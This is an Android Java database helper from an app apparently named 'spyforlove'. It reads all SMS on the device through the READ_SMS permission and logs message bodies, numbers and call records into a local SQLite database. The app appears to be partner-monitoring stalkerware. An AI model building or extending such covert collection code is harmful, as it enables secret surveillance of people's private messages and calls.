package chem.kth.spyforlove.database;

import android.Manifest;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.provider.Telephony;

import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import chem.kth.MainApplication;
import chem.kth.spyforlove.CallType;
import chem.kth.spyforlove.MessageType;
import chem.kth.spyforlove.model.PhoneCall;
import chem.kth.spyforlove.model.PhoneCallDateString;
import chem.kth.spyforlove.model.SMessage;
import chem.kth.spyforlove.utils.AppUtils;

public class DatabaseHelper {

    private static final DatabaseHelper helper = new DatabaseHelper();
    private final SqlHelper sqlHelper;
    private SQLiteDatabase db;

    public static DatabaseHelper getInstance() {
        return helper;
    }

    private DatabaseHelper() {
        sqlHelper = new SqlHelper(MainApplication.getContext());
    }

    private void openDb() {
        db = sqlHelper.getWritableDatabase();
    }

    private void closeDb() {
        if (db.isOpen()) {
            db.close();
        }
    }

    public long saveMessage(SMessage message) {
        openDb();
        ContentValues contentValues = new ContentValues();
        contentValues.put(SqlHelper.PHONE_NO, message.getPhoneNo());
        contentValues.put(SqlHelper.DATE, message.getDate().toString());
        contentValues.put(SqlHelper.BODY, message.getBody());
        contentValues.put(SqlHelper.MESSAGE_TYPE, message.getMessageType().name());
        long i = db.insert(SqlHelper.MESSAGE_TB, null, contentValues);
        closeDb();
        return i;
    }

    private List<SMessage> getMessageFromCursor(Cursor cursor) {
        List<SMessage> list = new ArrayList<>();
        for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
            int id = Integer.parseInt(cursor.getString(cursor.getColumnIndex(SqlHelper.ID)));
            String phoneNo = cursor.getString(cursor.getColumnIndex(SqlHelper.PHONE_NO));
            String body = cursor.getString(cursor.getColumnIndex(SqlHelper.BODY));
            String date = cursor.getString(cursor.getColumnIndex(SqlHelper.DATE));
            MessageType type = MessageType.valueOf(cursor.getString(cursor.getColumnIndex(SqlHelper.MESSAGE_TYPE)));
            SMessage sMessage = new SMessage(id, phoneNo, body, date, type);
            list.add(sMessage);
        }
        cursor.close();
        return list;
    }

    public List<SMessage> getLastOutgoingSMS(SMessage sMessage) {
        openDb();
        Cursor cursor = queryList(SqlHelper.MESSAGE_TB, SqlHelper.PHONE_NO + " =? AND " + SqlHelper.BODY + " =? ", new String[]{sMessage.getPhoneNo(), sMessage.getBody()});
//        Cursor cursor = queryList(SqlHelper.MESSAGE_TB, SqlHelper.DATE + " <=? " + sMessage.getDate(), new String[]{sMessage.getDate()});
        List<SMessage> sMessageList = getMessageFromCursor(cursor);
        closeDb();
        return sMessageList;
    }

    public List<SMessage> getMessages(String qDate) {
        openDb();
        Cursor cursor;
        if (qDate == null || qDate.isEmpty()) {
            cursor = queryList(SqlHelper.MESSAGE_TB, null, null);
        } else {
            cursor = queryList(SqlHelper.MESSAGE_TB, SqlHelper.DATE + " >? ", new String[]{qDate});
        }
        List<SMessage> list = getMessageFromCursor(cursor);
        closeDb();
        return list;
    }

    public List<PhoneCallDateString> getPhoneCalls(String qDate) {
        List<PhoneCallDateString> list = new ArrayList<>();
        Cursor cursor;
        openDb();
        if (qDate == null || qDate.isEmpty()) {
            cursor = queryList(SqlHelper.CALL_TABLE, null, null);
        } else {
            cursor = queryList(SqlHelper.CALL_TABLE, SqlHelper.START_DATE + " >? ", new String[]{qDate});
        }

        for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
            int id = (cursor.getInt(cursor.getColumnIndex(SqlHelper.ID)));
            String phoneNo = cursor.getString(cursor.getColumnIndex(SqlHelper.PHONE_NO));
            String callType = cursor.getString(cursor.getColumnIndex(SqlHelper.CALL_TYPE));
            String start_date = cursor.getString(cursor.getColumnIndex(SqlHelper.START_DATE));
            String end_date = cursor.getString(cursor.getColumnIndex(SqlHelper.END_DATE));
            CallType type = CallType.valueOf(callType);
            PhoneCallDateString phoneCall = new PhoneCallDateString(id, phoneNo, start_date, end_date, type);
            list.add(phoneCall);
        }
        cursor.close();
        closeDb();
        return list;
    }

    private Cursor queryList(String tableName, String selection, String[] args) {
        return db.query(tableName, null, selection, args, null, null, null);
    }

    public long saveCall(PhoneCall phoneCall) {
        openDb();
        ContentValues contentValues = new ContentValues();
        contentValues.put(SqlHelper.PHONE_NO, phoneCall.getPhone());
        contentValues.put(SqlHelper.CALL_TYPE, phoneCall.getCallType().name());
        contentValues.put(SqlHelper.START_DATE, phoneCall.getStart_date().toString());
        contentValues.put(SqlHelper.END_DATE, phoneCall.getEnd_date().toString());
        long i = db.insert(SqlHelper.CALL_TABLE, null, contentValues);
        closeDb();
        return i;
    }

    public long updateCallWithStartDate(PhoneCall phoneCall) {
        PhoneCall pCall = getLastOrOnePhoneCall(phoneCall.getPhone());
        openDb();
        long i = 0;
        if (pCall != null) {
            ContentValues contentValues = new ContentValues();
            contentValues.put(SqlHelper.PHONE_NO, pCall.getPhone());
            contentValues.put(SqlHelper.CALL_TYPE, phoneCall.getCallType().name());
            contentValues.put(SqlHelper.START_DATE, phoneCall.getStart_date().toString());
            contentValues.put(SqlHelper.END_DATE, phoneCall.getEnd_date().toString());

            i = db.update(SqlHelper.CALL_TABLE, contentValues, SqlHelper.PHONE_NO + " =? AND " + SqlHelper.ID + " =? ", new String[]{
                    phoneCall.getPhone(), String.valueOf(pCall.getId())
            });
        }
        closeDb();
        return i;
    }

    public List<SMessage> readSMS(boolean isReadAll) {
        List<SMessage> sMessageList = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(MainApplication.getContext(), Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            Cursor cursor;
            if (isReadAll) {
                cursor = MainApplication.getContext().getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            } else {
                cursor = MainApplication.getContext().getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 1");
            }
            for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
                String content = cursor.getString(cursor.getColumnIndex("body"));
                String smsNumber = cursor.getString(cursor.getColumnIndex("address"));
                int isIncoming = cursor.getInt(cursor.getColumnIndex("type"));
                long dateLong = Long.parseLong(cursor.getString(cursor.getColumnIndex("date")));
                Date date = AppUtils.convertTime(dateLong);
                MessageType messageType;
                if (isIncoming == 1) {
                    messageType = MessageType.INCOMING;
                } else if (isIncoming == 2) {
                    messageType = MessageType.OUTGOING;
                } else {
                    messageType = MessageType.OUTGOING;
                }
                sMessageList.add(new SMessage(0, smsNumber, content, date.toString(), messageType));
            }
            cursor.close();
        }
        return sMessageList;
    }

    public long updateCall(PhoneCall phoneCall) {
        PhoneCall pCall = getLastOrOnePhoneCall(phoneCall.getPhone());
        openDb();
        long i = 0;
        if (pCall != null) {
            ContentValues contentValues = new ContentValues();
            contentValues.put(SqlHelper.PHONE_NO, pCall.getPhone());
            contentValues.put(SqlHelper.CALL_TYPE, phoneCall.getCallType().name());
            contentValues.put(SqlHelper.START_DATE, pCall.getStart_date().toString());
            contentValues.put(SqlHelper.END_DATE, phoneCall.getEnd_date().toString());

            i = db.update(SqlHelper.CALL_TABLE, contentValues, SqlHelper.PHONE_NO + " =? AND " + SqlHelper.ID + " =? ", new String[]{
                    phoneCall.getPhone(), String.valueOf(pCall.getId())
            });
        }
        closeDb();
        return i;
    }

    public PhoneCall getLastOrOnePhoneCall(String phoneNumber) {
        openDb();
        PhoneCall pCall = null;
        Cursor cursor;
        if (phoneNumber == null || phoneNumber.isEmpty())
            cursor = db.query(SqlHelper.CALL_TABLE, null, null, null, null, null, SqlHelper.START_DATE + " DESC LIMIT 1");
        else
            cursor = db.query(SqlHelper.CALL_TABLE, null, SqlHelper.PHONE_NO + " =? ", new String[]{phoneNumber}, null, null, SqlHelper.START_DATE + " DESC LIMIT 1");
        if (cursor != null) {
            for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
                int id = cursor.getInt(cursor.getColumnIndex(SqlHelper.ID));
                String phoneNo = cursor.getString(cursor.getColumnIndex(SqlHelper.PHONE_NO));
                String callType = cursor.getString(cursor.getColumnIndex(SqlHelper.CALL_TYPE));
                Date start_date = new Date(cursor.getString(cursor.getColumnIndex(SqlHelper.START_DATE)));
                Date end_date = new Date(cursor.getString(cursor.getColumnIndex(SqlHelper.END_DATE)));
                CallType type = CallType.valueOf(callType);
                pCall = new PhoneCall(id, phoneNo, start_date, end_date, type);
            }
            cursor.close();
        }
        closeDb();
        return pCall;
    }

    public static class SqlHelper extends SQLiteOpenHelper {
        private static final String DATE = "date_time";
        private static final String DB = "sp_for_love";
        private static final String MESSAGE_TB = "messages";
        private static final String MESSAGE_TYPE = "type";
        private static final String ID = "_id";
        private static final String BODY = "messages";
        private static final String PHONE_NO = "phone_no";

        private static final String CALL_TABLE = "phone_call_list";
        private static final String START_DATE = "start_date";
        private static final String END_DATE = "end_date";
        private static final String CALL_TYPE = "type";

        public SqlHelper(@Nullable Context context) {
            super(context, DB, null, 1);
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE " + MESSAGE_TB + "("
                    + ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                    PHONE_NO + " TEXT, " +
                    DATE + " TEXT, " +
                    BODY + " TEXT, " +
                    MESSAGE_TYPE + " TEXT " +
                    ")");
            db.execSQL("CREATE TABLE " + CALL_TABLE + "("
                    + ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                    PHONE_NO + " TEXT, " +
                    START_DATE + " TEXT, " +
                    CALL_TYPE + " TEXT, " +
                    END_DATE + " TEXT " +
                    ")");
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        }
    }

}
